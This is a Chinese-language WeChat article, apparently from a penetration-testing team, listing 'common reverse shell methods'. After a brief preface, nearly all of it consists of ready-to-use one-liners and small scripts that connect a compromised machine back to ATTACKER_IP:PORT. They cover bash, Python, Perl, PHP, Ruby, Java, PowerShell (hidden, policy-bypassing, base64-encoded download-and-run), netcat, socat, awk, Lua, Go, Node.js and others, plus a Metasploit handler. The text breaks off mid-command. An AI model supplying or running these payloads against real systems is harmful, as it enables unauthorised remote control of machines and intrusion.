---
title: 【牛马专区】常见的42种反弹shell方式
url: https://mp.weixin.qq.com/s/7H9Er9sgoR3UCH9X5xnQpg
source: Doonsec's feed
date: 2026-01-18
fetch_date: 2026-01-19T03:44:13.712532
---

# 【牛马专区】常见的42种反弹shell方式

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWEDup4ARh2bqAATJDwX3F87dHLcjia00Jt8N3iaK6QGqh60BhibOb6FYQkic1nZbkwVg963ZyJckATicibQ/0?wx_fmt=jpeg)

# 【牛马专区】常见的42种反弹shell方式

泷羽Sec-tyg

![]()

在小说阅读器中沉浸阅读

以下文章来源于泷羽Sec
，作者仙草里没有草噜丶

![](http://wx.qlogo.cn/mmhead/Hp9HAaP9GFBKneKn5ryBUs0PRR7YFdhjkVm1EtmTw39DFXQog0cNn1NibPUo2tbPL2mH1HymCVxM/0)

**泷羽Sec**
.

B站：泷羽Sec，团队专注于网络安全领域的内容创作与分享，为网络安全而战。来自一个从零开始学习网安的见习生。很菜，不喜勿喷。

## 一、前言

继上一篇：[近400个渗透测试常用命令，信息收集、web、内网、隐藏通信、域渗透等等](https://mp.weixin.qq.com/s?__biz=Mzg2Nzk0NjA4Mg==&mid=2247502791&idx=1&sn=d113f9b4fb661e66e8ab69d27c186c2b&scene=21#wechat_redirect)

这一篇主要介绍常用的**反弹shell**的命令

在平时获取到命令执行执行权限的时候，通常都需要使用反弹shell来获取一个稳定的shell，从而绕过防火墙等安全机制的限制

另外反弹过来的shell有一个优点，就是通过`/bin/bash`或者`python3 -c 'import pty;pty.spawn("/bin/bash")'`或者其他命令来创建交互式 shell，从而能够执行像`su`命令切换用户，添加用户相关的命令，它会让你输入相关的信息，**这个输入的过程是普通的shell所做不到的**，例如

![image-20251204194434244](https://mmbiz.qpic.cn/mmbiz/5975bXHXfWEDup4ARh2bqAATJDwX3F87arcd7zsZAxJa6fxzZmyMFI8kkoEmfWYFQb25CjuhtlppuaUd07JcSg/640?wx_fmt=other&from=appmsg)

image-20251204194434244

那么接下来就看看反弹shell的方式有哪些

注意：ATTACKER\_IP代表你需要将一个shell反弹到的地址，port代表反弹shell的端口

## 二、基于Bash/Terminal的反弹

### 2.1 经典TCP反弹

```
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

### 2.2 使用文件描述符

```
exec 5<>/dev/tcp/ATTACKER_IP/PORT; cat <&5 | while read line; do $line 2>&5 >&5; done
```

### 2.3 使用管道

```
mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

### 2.4 UDP反弹（较少检测）

```
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
```

### 2.5 反弹到多个端口

```
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 & bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1
```

### 2.6 bash反弹绕过

```
bash -c '/bin/bash -i >& /dev/tcp/10.10.10.130/1234 0>&1'
```

## 三、Python反弹shell

### 3.1 Python2

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### 3.2 Python3

```
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];import pty; pty.spawn("/bin/bash")'
```

### 3.3 Python使用pty模块

```
python -c 'import pty, socket; s=socket.socket(); s.connect(("ATTACKER_IP",PORT)); [os.dup2(s.fileno(),f) for f in (0,1,2)]; pty.spawn("/bin/sh")'
```

### 3.4 Python单行编码

```
python -c "exec(__import__('base64').b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIkFUVEFDS0VSX0lQIixQT1JUKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ=='))"
```

## 四、Perl反弹shell

### 4.1 经典Perl反弹

```
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 4.2 Perl简写版

```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## 五、PHP反弹shell

### 5.1 PHP fsockopen

```
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### 5.2 PHP socket\_create

```
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect($s,"ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### 5.3 PHP反引号执行

```
php -r 'system("bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\'");'
```

## 六、Ruby反弹shell

### 6.1 Ruby TCPSocket

```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### 6.2 Ruby exec

```
ruby -rsocket -e 'c=TCPSocket.new("ATTACKER_IP","PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## 七、Java反弹shell

### 7.1 Java Runtime.exec

```
Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done"});
```

### 7.2 Java完整类

```
public class ReverseShell {
    public static void main(String[] args) throws Exception {
        String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"};
        Runtime.getRuntime().exec(cmd);
    }
}
```

## 八、PowerShell反弹shell

### 8.1 PowerShell

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### 8.2 PowerShell Base64编码

```
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AQQBUAFQAQQBDAEsARQBSAF8ASQBQADoAUABPAFIAVAAvAHIAZQB2AGUAcgBzAGUALgBwAHMAMQAnACkA
```

## 九、Netcat反弹shell

### 9.1 nc传统版

```
nc -e /bin/sh ATTACKER_IP PORT
```

### 9.2 nc没有-e参数时

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
```

### 9.3 nc UDP反弹

```
nc -u ATTACKER_IP PORT -e /bin/sh
```

### 9.4 ncat（nmap版）

```
ncat ATTACKER_IP PORT -e /bin/bash
```

### 9.5 nc反弹msf

```
msfconsole
use exploit/multi/handler

set PAYLOAD windows/shell_reverse_tcp

set LHOST 192.168.53.51
set LPORT 1234
run -j

use multi/recon/local_exploit_suggester
set session 3
run
```

## 十、Socat反弹shell

### 10.1 Socat TCP

```
socat TCP:ATTACKER_IP:PORT EXEC:/bin/bash
```

### 10.2 Socat UDP

```
socat UDP:ATTACKER_IP:PORT EXEC:/bin/bash
```

### 10.3 Socat SSL加密

```
socat OPENSSL:ATTACKER_IP:PORT EXEC:/bin/bash
```

## 十一、Awk反弹shell

### 11.1 Awk TCP连接

```
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/PORT"; while(1) { do { printf "shell>" |& s; s |& getline c; if(c) { while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'
```

## 十二、Telnet反弹shell

### 12.1 Telnet双端口

```
telnet ATTACKER_IP 4444 | /bin/sh | telnet ATTACKER_IP 4445
```

## 十三、Lua反弹shell

### 13.1 Lua socket

```
lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER_IP','PORT');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

## 十四、Go反弹shell

### 14.1 Go语言单行

```
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","ATTACKER_IP:PORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go
```

## 十五、Node.js反弹shell

### 15.1 Node.js子进程

```
require('child_process').exec('nc -e /bin/sh ATTACKER_IP PORT')
```

### 15.2 Node.js socket版

```
(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(PORT, "ATTACKER_IP", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();
```

## 十六、Openssl加密反弹

### 16.1 Openssl加密连接

```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:PORT > /tmp/s; rm /tmp/s
```

### 16.2 Openssl证书认证

```
openssl s_client -connect ATTACKER_IP:PORT -quiet -cert client.pem -key client.key
```

## 十七、Zsh反弹shell

### 17.1 Zsh内置TCP

```
zsh -c 'zmodload zsh/net/tcp && ztcp ATTACKER_IP PORT && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```

## 十八、Expect反弹shell

### 18.1 Expect脚本

```
#!/usr/bin/expect
set host ATTACKER_IP
set port PORT
spawn /bin/bash
expect "$ "
send "bash -i >& /dev/tcp/$host/$port 0>&1\r"
interact
```

## 十九、基于/dev/tcp的各种变形

### 19.1 使用exec重定向

```
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196
```

### 19.2 使用readline

```
exec 5<>/dev/tcp/ATTACKER_IP/PORT; cat <&5 | while read line; do $line 2>&5 >&5; ...